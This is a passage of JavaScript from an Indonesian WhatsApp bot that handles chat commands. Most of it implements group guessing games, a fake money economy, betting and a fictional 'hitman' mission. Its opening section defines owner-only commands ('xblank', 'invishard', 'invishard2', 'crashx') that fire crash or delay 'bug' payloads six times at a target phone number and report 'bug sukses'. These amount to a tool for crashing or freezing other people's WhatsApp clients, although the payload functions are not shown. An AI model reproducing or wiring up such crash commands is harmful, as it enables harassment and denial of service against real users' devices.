reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁")
  
}
break
case 'xblank':
    if (!isRyuuTheCreator) return reply("❌ Khusus Owner.");
    if (!args[0]) return reply("Contoh: .xblank 628xxxx");
    await DelayWithBlank(RyuuBotz, target)
    await DelayWithBlank(RyuuBotz, target)
    await DelayWithBlank(RyuuBotz, target)
    await DelayWithBlank(RyuuBotz, target)
    await DelayWithBlank(RyuuBotz, target)
    await DelayWithBlank(RyuuBotz, target);
    reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁");
    break;
    case 'invishard':
    if (!isRyuuTheCreator) return reply("❌ Khusus Owner.");
    if (!args[0]) return reply("Contoh: .invishard 628xxxx");
    await invishard(RyuuBotz, target)
    await invishard(RyuuBotz, target)
    await invishard(RyuuBotz, target)
    await invishard(RyuuBotz, target)
    await invishard(RyuuBotz, target)
    await invishard(RyuuBotz, target);
    reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁");
    break;
    case 'invishard2':
    if (!isRyuuTheCreator) return reply("❌ Khusus Owner.");
    if (!args[0]) return reply("Contoh: .invishard2 628xxxx");
    await invishard2(RyuuBotz, target)
    await invishard2(RyuuBotz, target)
    await invishard2(RyuuBotz, target)
    await invishard2(RyuuBotz, target)
    await invishard2(RyuuBotz, target)
    await invishard2(RyuuBotz, target);
    reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁");
    break;
    case 'crashx':
    if (!isRyuuTheCreator) return reply("❌ Khusus Owner.");
    if (!args[0]) return reply("Contoh: .crashx 628xxxx");
    await NewCrashX(RyuuBotz, target)
    await NewCrashX(RyuuBotz, target)
    await NewCrashX(RyuuBotz, target)
    await NewCrashX(RyuuBotz, target)
    await NewCrashX(RyuuBotz, target)
    await NewCrashX(RyuuBotz, target);
    reply("𝗯𝘂𝗴 𝘀𝘂𝗸𝘀𝗲𝘀 𝗰𝗲𝗸 𝘁𝗮𝗿𝗴𝗲𝘁");
    break;
//================================================================
case 'tebakgambar': {
  if (!m.isGroup) return reply(mess.only.group)
let timeout = 60000
let id = m.chat
if (id in RyuuBotz.tebakkata) return replyReinzID("Masih Ada Sesi Yang Belum Diselesaikan!")
async function tebakgambar() {
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakgambar.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 return {
      img: result.img,
      jawaban: result.jawaban,
      deskripsi: result.deskripsi
    }}
  let tos = await tebakgambar ()
  console.log(tos)
 let caption = `Silahkan Jawab Soal Di Atas Ini\n\nDeskripsi : ${tos.deskripsi}\nWaktu : 60s\nHadiah : 10.000 money`
 RyuuBotz.tebakgambar[id] = [
    await RyuuBotz.sendMessage(from, {caption: caption, image: {url: tos.img}}, {quoted: m}),
    tos,
 setTimeout(() => {
	if (RyuuBotz.tebakgambar[id])
 replyReinzID(`Waktu Habis\nJawaban:  ${tos.jawaban}\n\nIngin bermain? Ketik tebakgambar`)
 delete RyuuBotz.tebakgambar[id]
 }, 60000)
	 ]
}
break
//==================================================================
case 'tebaklagu': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) return replyReinzID("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await JSON.parse(fs.readFileSync('./node_modules/Arisu-MD/lib/tebaklagu.json'));
 let result = anu[Math.floor(Math.random() * anu.length)]
 let msg = await RyuuBotz.sendMessage(from, { audio: { url: result.link_song }, mimetype: 'audio/mpeg' }, {quoted:m})
 RyuuBotz.sendText(from, `Lagu Tersebut Adalah Lagu dari?\n\nArtist : ${result.artist}\nWaktu : 60s`, msg).then(() => {
 tebaklagu[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebaklagu.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 RyuuBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebaklagu[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lagu`},{quoted:m}) 
 delete tebaklagu[m.sender.split('@')[0]]
 }
}
break
case 'tebakkata': {
if (!m.isGroup) return reply(mess.only.group)
  let timeout = 60000
  let id = m.chat
	if (id in RyuuBotz.tebakkata) return replyReinzID("Masih Ada Sesi Yang Belum Diselesaikan!")
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let caption = `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${json.soal}\nWaktu : 60s\nHadiah : 10.000 money`
 RyuuBotz.tebakkata[id] = [
	await replyReinzID(`${caption}`),
	json,
 setTimeout(() => {
 if (RyuuBotz.tebakkata[id]) 
 console.log("Jawaban: " + json.jawaban)
 replyReinzID(`Waktu Habis\nJawaban:  ${json.jawaban}\n\nIngin bermain? Ketik tebakkata`) 
 delete RyuuBotz.tebakkata[id]
 }, 60000)
 ]
}
break
//==================================================================
case 'tebakkalimat': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) return replyReinzID("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkalimat.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 RyuuBotz.sendText(from, `Silahkan Jawab Pertanyaan Berikut\n\n${result.soal}\nWaktu : 60s`, m).then(() => {
 tebakkalimat[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
 })
 await sleep(60000)
 if (tebakkalimat.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 RyuuBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, caption:`Waktu Habis\nJawaban:  ${tebakkalimat[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak kalimat`}, {quoted:m}) 
 delete tebakkalimat[m.sender.split('@')[0]]
 }
}
break
//==================================================================
case 'tebaklirik':{
  if (!m.isGroup) return reply(mess.only.group)
let users = global.db.users[m.sender]
	let timeout = 60000
	let poin = 10000
	let id = m.chat
	if (id in RyuuBotz.tebaklirik) return replyReinzID('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaklirik.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Bonus: ${poin} XP
	Hadiah: ${poin} Money
	`.trim()
	RyuuBotz.tebaklirik[id] = [
	await replyReinzID(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (RyuuBotz.tebaklirik[id]) 
users.money -= 200
replyReinzID(`*GAME TEBAK LIRIK*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].balance.toLocaleString()}*`)
	delete RyuuBotz.tebaklirik[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'caklontong': {
  if (!m.isGroup) return reply(mess.only.group)
if (caklontong.hasOwnProperty(m.sender.split('@')[0])) return replyReinzID("Masih Ada Sesi Yang Belum Diselesaikan!")
 let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/caklontong.json')
 let result = anu[Math.floor(Math.random() * anu.length)]
 RyuuBotz.sendText(from, `*Jawablah Pertanyaan Berikut :*\n${result.soal}*\nWaktu : 60s`, m).then(() => {
 caklontong[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
caklontong_desk[m.sender.split('@')[0]] = result.deskripsi
 })
 await sleep(60000)
 if (caklontong.hasOwnProperty(m.sender.split('@')[0])) {
 console.log("Jawaban: " + result.jawaban)
 RyuuBotz.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/96bb6ca28d6ef7fea479f.jpg' }, caption:`Waktu Habis\nJawaban:  ${caklontong[m.sender.split('@')[0]]}\nDeskripsi : ${caklontong_desk[m.sender.split('@')[0]]}\n\nIngin bermain? Ketik tebak lontong`}, {quoted:m}) 
 delete caklontong[m.sender.split('@')[0]]
delete caklontong_desk[m.sender.split('@')[0]]
 }
}
break
//==================================================================
case 'family100': {
  if (!m.isGroup) return reply(mess.only.group)
  let winScore = 10000
 let id = m.chat
	if (id in RyuuBotz.family100) return replyReinzID('Masih Ada Sesi Yang Belum Diselesaikan!')
 let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/family100.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
 let hasil = `*Jawablah Pertanyaan Berikut :*\n\nSoal : ${json.soal}\n\nHadiah : 10.000 money\n\nTerdapat *${json.jawaban.length}* Jawaban ${json.jawaban.find(v => v.includes(' ')) ? `(beberapa Jawaban Terdapat Spasi)` : ''}`.trim()
 RyuuBotz.family100[id] = {
			id,
			msg: await replyReinzID(`${hasil}`),
			...json,
			terjawab: Array.from(json.jawaban, () => false),
      winScore,  
        }
}
break
//==================================================================
case 'upvn':{
if (!isRyuuTheCreator) return reply(`Ngapain ? Fitur Ini Khusus Tuan Saya😜`)
function getRandomHexColor() {
  return "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0");
}
const media = await RyuuBotz.downloadAndSaveMediaMessage(quoted)
RyuuBotz.sendMessage('status@broadcast', {audio: { url: media }, mimetype: 'audio/mp3', ptt:true },{
backgroundColor: getRandomHexColor(),
statusJidList: Object.keys(db.users)
});
}
reply(`*Sukses mengirim status whatsapp ke  Orang Yang Ada Di database*`)
break
//==================================================================
case 'tebaktebakan': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) return replyReinzID("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebaktebakan.json')
let result = anu[Math.floor(Math.random() * anu.length)]
RyuuBotz.sendText(m.chat, `Jawablah Pertanyaan Berikut : *${result.soal}*?\nWaktu : 60s`, m).then(() => {
    tebaktebakan[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebaktebakan.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    RyuuBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebaktebakan[m.sender.split('@')[0]]}`, m)
    delete tebaktebakan[m.sender.split('@')[0]]
}}
break
//==================================================================
case 'tebakbendera': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return replyReinzID("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
let result = anu[Math.floor(Math.random() * anu.length)]
RyuuBotz.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.name)
    RyuuBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
    delete tebakbendera[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakbenderav2': {
  if (!m.isGroup) return reply(mess.only.group)
 if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) return replyReinzID("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera.json')
let result = anu[Math.floor(Math.random() * anu.length)]
RyuuBotz.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Silahkan Jawab Gambar Berikut\n\nClue : ${result.flag}\nWaktu : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.name)
    RyuuBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera[m.sender.split('@')[0]]}`, m)
    delete tebakbendera[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakkabupaten': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) return replyReinzID("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkabupaten.json')
let result = anu[Math.floor(Math.random() * anu.length)]
RyuuBotz.sendImage(m.chat, result.url, `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`, m).then(() => {
    tebakkabupaten[m.sender.split('@')[0]] = result.title.toLowerCase()
})
await sleep(60000)
if (tebakkabupaten.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.title)
    RyuuBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkabupaten[m.sender.split('@')[0]]}`, m)
    delete tebakkabupaten[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'tebakkimia': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) return replyReinzID("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakkimia.json')
let result = anu[Math.floor(Math.random() * anu.length)]
RyuuBotz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nUnsur : ${result.unsur}\nWaktu : 60s`, m).then(() => {
    tebakkimia[m.sender.split('@')[0]] = result.lambang.toLowerCase()
})
await sleep(60000)
if (tebakkimia.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.lambang)
    RyuuBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakkimia[m.sender.split('@')[0]]}`, m)
    delete tebakkimia[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'asahotak': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) return replyReinzID("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/asahotak.json')
let result = anu[Math.floor(Math.random() * anu.length)]
RyuuBotz.sendText(m.chat, `Silahkan Jawab Pertanyaan Berikut\n\nSoal : ${result.soal}\nWaktu : 60s`, m).then(() => {
    tebakasahotak[m.sender.split('@')[0]] = result.jawaban.toLowerCase()
})
await sleep(60000)
if (tebakasahotak.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.jawaban)
    RyuuBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakasahotak[m.sender.split('@')[0]]}`, m)
    delete tebakasahotak[m.sender.split('@')[0]]
}}
break
//==================================================================
case 'siapaaku':{
  if (!m.isGroup) return reply(mess.only.group)
  let users = global.db.users[m.sender]
	let timeout = 60000 
	let poin = 10000
	let id = m.chat 
	if (id in RyuuBotz.siapaaku) return replyReinzID('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/siapakahaku.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	 
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	RyuuBotz.siapaaku[id] = [
	await replyReinzID(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (RyuuBotz.siapaaku[id]) 
users.money -= 200
replyReinzID(`*GAME SIAPAKAH AKU*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].money.toLocaleString()}*`)
	delete RyuuBotz.siapaaku[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'susunkata':{
  if (!m.isGroup) return reply(mess.only.group)
	let timeout = 60000
	let poin = 10000
	let id = m.chat
	if (id in RyuuBotz.susunkata) return replyReinzID('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/susunkata.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
Tipe: ${json.tipe}
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Hadiah: ${poin} Money
	`.trim()
	RyuuBotz.susunkata[id] = [
	await replyReinzID(`${caption}`),
	json, poin,
	setTimeout(() => {
replyReinzID(`*GAME SUSUN KATA*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.data.users[sender].money.toLocaleString()}*`)
	delete RyuuBotz.susunkata[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'tekateki':{
  if (!m.isGroup) return reply(mess.only.group)
	let timeout = 60000
	let users = global.db.users[m.sender]
	let poin = 10000
	let id = m.chat
	if (id in RyuuBotz.tekateki) return replyReinzID('Masih ada soal belum terjawab di chat ini')
	let src = await (await fetch('https://raw.githubusercontent.com/BochilTeam/database/master/games/tekateki.json')).json()
	let json = src[Math.floor(Math.random() * src.length)]
	let caption = `
	Soal: ${json.soal}
	
	
	Waktu: *${(timeout / 1000).toFixed(2)} detik*
	Bonus: ${poin} XP
	Hadiah: ${poin} Money 💸
	`.trim()
	RyuuBotz.tekateki[id] = [
	await replyReinzID(`${caption}`),
	json, poin,
	setTimeout(() => {
	if (RyuuBotz.tekateki[id]) 
users.money -= 200
replyReinzID(`*GAME TEKA-TEKI*\n\nWaktu habis!\n𖦹 Jawabannya adalah; *${json.jawaban}*\n𖦹 Saldo kamu dikurangi 200\n𖦹 Sisa Saldo kamu: *${db.users[sender].money.toLocaleString()}*`)
	delete RyuuBotz.tekateki[id]
	 }, timeout)
	 ]
	}
	break
//==================================================================
case 'tebakbendera2': {
  if (!m.isGroup) return reply(mess.only.group)
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) return replyReinzID("Masih Ada Sesi Yang Belum Diselesaikan!")
let anu = await fetchJson('https://raw.githubusercontent.com/BochilTeam/database/master/games/tebakbendera2.json')
let result = anu[Math.floor(Math.random() * anu.length)]
RyuuBotz.sendMessage(m.chat, {
    image: {
        url: result.img
    },
    caption: `Silahkan Jawab Gambar Berikut\n\nWaktu : 60s`
}, {
    quoted: m
}).then(() => {
    tebakbendera2[m.sender.split('@')[0]] = result.name.toLowerCase()
})
await sleep(60000)
if (tebakbendera2.hasOwnProperty(m.sender.split('@')[0])) {
    console.log("Jawaban: " + result.name)
    RyuuBotz.sendText(m.chat, `Waktu Habis\nJawaban:  ${tebakbendera2[m.sender.split('@')[0]]}`, m)
    delete tebakbendera2[m.sender.split('@')[0]]
}
}
break
//==================================================================
case 'banknabung': {
  if (!m.isGroup) return reply(mess.only.group)
const xpperlimit = 1
  let user = global.db.users[m.sender]
  let all = command.replace(/^tarik/i, '')
  let count = all ? all : args[0]
  count = count ? /all/i.test(count) ? Math.floor(user.money / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)
  if (user.atm == 0) return replyReinzID('kamu belum mempunyai kartu ATM')
  if (user.bank > user.fullatm) return replyReinzID('Uang Di ATM sudah penuh!')
  if (count > user.fullatm - user.bank) return reply('Uangnya nya sudah mencapai batas')
  if (user.money >= xpperlimit * count) {
    user.money -= xpperlimit * count
    user.bank += count
    replyReinzID(`Sukses menabung sebesar ${count} Money 💹`)
  } else replyReinzID(`[❗] Uang anda tidak mencukupi untuk menabung ${count} money 💹`, )
}
break
//==================================================================
case 'banktarik': {
  if (!m.isGroup) return reply(mess.only.group)
const xpperlimit = 1
  let user = global.db.users[m.sender]
  let all = command.replace(/^tarik/i, '')
  let count = all ? all : args[0]
  count = count ? /all/i.test(count) ? Math.floor(user.bank / xpperlimit) : parseInt(count) : args[0] ? parseInt(args[0]) : 1
  count = Math.max(1, count)
  if (user.atm == 0) return replyReinzID('kamu belum mempuyai kartu ATM !')
  if (user.bank >= xpperlimit * count) {
    user.bank -= xpperlimit * count
    user.money += count
    replyReinzID(`Sukses menarik sebesar ${count} Money 💹`)
  } else replyReinzID(`[❗] Uang dibank anda tidak mencukupi untuk ditarik sebesar ${count} money 💹`)
}
break
//==================================================================
case 'berkebon':{
  if (!m.isGroup) return reply(mess.only.group)
function clockString(ms) {
    let h = Math.floor(ms / 3600000)
    let m = Math.floor(ms / 60000) % 60
    let s = Math.floor(ms / 1000) % 60
    return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
const timeout = 1800000
    let __timers = (new Date - global.db.users[m.sender].lastberkebon)
    let _timers = (timeout - __timers)
    let timers = clockString(_timers)
    let user = global.db.users[m.sender]
    let { stock } = global.db.settings[botNumber]
    let pisang = 100 - user.bibitpisang
    let anggur = 100 - user.bibitanggur
    let mangga = 100 - user.bibitmangga
    let jeruk = 100 - user.bibitjeruk
    let apel = 100 - user.bibitapel
    let kerja = 'Berkebun'
    let id = m.chat
    .misi = RyuuBotz.misi ? RyuuBotz.misi : {}
    if (id in RyuuBotz.misi) {
        replyReinzID(`Selesaikan Misi ${RyuuBotz.misi[id][0]} Terlebih Dahulu`)
        return false
    }
    let caption = `
📮 Kamu Membutuhkan Bibit:\n${user.bibitpisang < 100 ? `\n${global.rpg.emoticon('bibitpisang')} BibitPisang: ${pisang}`: ''} ${user.bibitanggur < 100 ? `\n${global.rpg.emoticon('bibitanggur')} BibitAnggur: ${anggur}`: ''} ${user.bibitmangga < 100 ? `\n${global.rpg.emoticon('bibitmangga')} BibitMangga: ${mangga}`: ''} ${user.bibitjeruk < 100 ? `\n${global.rpg.emoticon('bibitjeruk')} BibitJeruk: ${jeruk}`: ''} ${user.bibitapel < 100 ? `\n${global.rpg.emoticon('bibitapel')} BibitApel: ${apel}`: ''}`.trim()
    if (new Date - user.lastberkebon > 1800000) {
        if (user.bibitpisang >= 100 && user.bibitanggur >= 100 && user.bibitmangga >= 100 && user.bibitapel >= 100 && user.bibitjeruk >= 100) {
            let hasil1 = Math.floor(Math.random() * 100)
            let hasil2 = Math.floor(Math.random() * 100)
            let hasil3 = Math.floor(Math.random() * 100)
            let hasil4 = Math.floor(Math.random() * 100)
            let hasil5 = Math.floor(Math.random() * 100)

            let caption = `⌛ Hasil Panen Kamu

${global.rpg.emoticon('pisang')} Pisang: ${hasil1}
${global.rpg.emoticon('anggur')} Anggur ${hasil2}
${global.rpg.emoticon('mangga')} Mangga: ${hasil3}
${global.rpg.emoticon('jeruk')} Jeruk: ${hasil4}
${global.rpg.emoticon('apel')} Apel: ${hasil5}
`
            user.pisang += hasil1
            user.anggur += hasil2
            user.mangga += hasil3
            user.jeruk += hasil4
            user.apel += hasil5

            user.bibitpisang -= 100
            user.bibitanggur -= 100
            user.bibitmangga -= 100
            user.bibitjeruk -= 100
            user.bibitapel -= 100

            stock.bibitpisang += 100
            stock.bibitanggur += 100
            stock.bibitmangga += 100
            stock.bibitjeruk += 100
            stock.bibitapel += 100


            RyuuBotz.misi[id] = [
kerja,
setTimeout(() => {
delete RyuuBotz.misi[id]
}, 20000)
            ]

            setTimeout(() => {
replyReinzID(`${caption.trim()}`)
            }, 20000)

            setTimeout(() => {
replyReinzID('Sedang Menanam Bibit...')
            }, 0)
            user.lastberkebon = new Date * 1
        } else replyReinzID(`${caption}`)
    } else replyReinzID(`Mohon Menunggu Selama ${timers} Untuk Berkebun Kembali...`)
}
break
//==================================================================
case 'bet': {
  if (!m.isGroup) return reply(mess.only.group)
  function number(x = 0) {
    x = parseInt(x)
    return !isNaN(x) && typeof x == 'number'
}
const items = [ 'money', 'chip' ]
    let user = global.db.users[m.sender]
    let item = items.filter(v => v in user && typeof user[v] == 'number')
    let type = (args[0] || '').toLowerCase()
    let count = (args[1] && number(parseInt(args[1])) ? Math.max(parseInt(args[1]), 1): /all/i.test(args[1]) ? Math.floor(parseInt(user[type])): 1) * 1
    if (!item.includes(type)) return replyReinzID(`*List Item:*\n${item.map(v => `${global.rpg.emoticon(v)}${v}`.trim()).join('\n')}\n\nContoh:\nbet money 100000`)
    if ((user[type] * 1) < count) return replyReinzID(`*${type} ${global.rpg.emoticon(type)}* kamu tidak cukup!!`)
    let moneyDulu = user[type] * 1
    let txt = (m.msg && m.msg.selectedDisplayText ? m.msg.selectedDisplayText: m.text ? m.text: '').toLowerCase()
    try {
        let Bot = (Math.ceil(Math.random() * 91)) * 1
        let Kamu = (Math.floor(Math.random() * 71)) * 1
        let status = 'Kalah'
        if (Bot < Kamu) {
            user[type] += count * 1
            status = 'Menang'
        } else if (Bot > Kamu) {
            user[type] -= count * 1
        } else {
            status = 'Seri'
            user[type] += (Math.floor(count / 1.5)) * 1
        }
        replyReinzID(`
| *PLAYERS* | *POINT* |
*🤖 BOT:*      ${Bot}
*👤 KAMU:*    ${Kamu}

Kamu *${status}*, kamu ${status == 'Menang' ? `Mendapatkan *+${count * 2}*`: status == 'Kalah' ? `Kehilangan *-${count * 1}*`: `Mendapatkan *+${Math.floor(count / 1.5)}*`} *${type} ${global.rpg.emoticon(type)}*
`.trim())
    } catch (e) {
        if (moneyDulu > (user[type] * 1)) user[type] = moneyDulu * 1
        replyReinzID('Error saat melakukan judi (Rejected)')
    }
}
break
//==================================================================
case 'claim':
case 'bonus': {
  if (!m.isGroup) return reply(mess.only.group)
function msToTime(duration) {
    var milliseconds = parseInt((duration % 1000) / 100),
    seconds = Math.floor((duration / 1000) % 60),
    minutes = Math.floor((duration / (1000 * 60)) % 60),
    hours = Math.floor((duration / (1000 * 60 * 60)) % 24)
    hours = (hours < 10) ? "0" + hours : hours
    minutes = (minutes < 10) ? "0" + minutes : minutes
    seconds = (seconds < 10) ? "0" + seconds : seconds

  return hours + " jam " + minutes + " menit " + seconds + " detik"
}
    let user = global.db.users[m.sender]
    let time = user.lastbonus + 86400000
    if (new Date - user.lastbonus < 86400000) return replyReinzID(`Kamu Sudah Ambil Bonus Hari Ini\nTunggu selama ${msToTime(time - new Date())} lagi`)
    let money = Math.floor(Math.random() * 50000000)
    user.money += money * 1
    user.lastbonus = new Date * 1
    replyReinzID(`Selamat Kamu Mendapatkan Bonus : \n+${money} Money`)
}
break
//==================================================================
case 'buah': {
  if (!m.isGroup) return reply(mess.only.group)
	let user = global.db.users[m.sender]
	let ini_txt = `[ *GUDANG BUAH KAMU* ]\n\n`
	ini_txt += `🍌 ${user.pisang} Pisang\n`
	ini_txt += `🍇 ${user.anggur} Anggur\n`
	ini_txt += `🥭 ${user.mangga} Mangga\n`
	ini_txt += `🍊 ${user.jeruk} Jeruk\n`
	ini_txt += `🍎 ${user.apel} Apel\n\n`
	ini_txt += `Gunakan command *buah sell* untuk menjual.`
	replyReinzID(`${ini_txt}`)
}
break
//==================================================================
case 'bunuh':
case 'hitman': {
  if (!m.isGroup) return reply(mess.only.group)
  function clockString(ms) {
        let h = Math.floor(ms / 3600000)
        let m = Math.floor(ms / 60000) % 60
        let s = Math.floor(ms / 1000) % 60
        return [h, m, s].map(v => v.toString().padStart(2, 0)).join(':')
}
    let __timers = (new Date - global.db.users[m.sender].lastmisi)
    let _timers = (3600000 - __timers)
    let order = global.db.users[m.sender].ojekk
    let timers = clockString(_timers)
    let name = RyuuBotz.getName(m.sender)
    let user = global.db.users[m.sender]
    let id = m.sender
	let kerja = 'Bunuh'
    RyuuBotz.misi = RyuuBotz.misi ? RyuuBotz.misi : {}
    if (id in RyuuBotz.misi) {
        replyReinzID(`Selesaikan Misi ${RyuuBotz.misi[id][0]} Terlebih Dahulu`)
        throw false
    }
    if (new Date - global.db.users[m.sender].lastmisi > 3600000) {
        let randomaku4 = Math.floor(Math.random() * 10)
        let randomaku5 = Math.floor(Math.random() * 10)

        let rbrb4 = (randomaku4 * 100000)
        let rbrb5 = (randomaku5 * 1000)

        var dimas = `
🕵️ Mendapatkan Target.....
`.trim()

        var dimas2 = `
⚔️ Menusuk Tubuhnya.....
`.trim()

        var dimas3 = `
☠️ Target meninggal\nDan kamu mengambil barang² nya
`.trim()

        var dimas4 = `
💼 Hasil dari membunuh....
`.trim()

        var hsl = `
*—[ Hasil ${name} ]—*
➕ 💹 Uang = [ ${rbrb4} ]
➕ ✨ Exp = [ ${rbrb5} ]
➕ 👮 Pelanggaran +1
➕ ☑️ Misi Berhasil = +1
➕  📥Total Misi Sebelumnya : ${order}
`.trim()

		user.money += rbrb4
        user.exp += rbrb5
        user.ojekk += 1
        user.warn += 1

		RyuuBotz.misi[id] = [
        	kerja,
        setTimeout(() => {
            delete RyuuBotz.misi[id]
        }, 27000)
    	]
        setTimeout(() => {
            replyReinzID(`${hsl}`)
        }, 27000)

        setTimeout(() => {
            replyReinzID(`${dimas4}`)
        }, 25000)

        setTimeout(() => {
            replyReinzID(`${dimas3}`)
        }, 20000)

        setTimeout(() => {
            replyReinzID(`${dimas2}`)
        }, 15000)

        setTimeout(() => {
            replyReinzID(`${dimas}`)
        }, 10000)

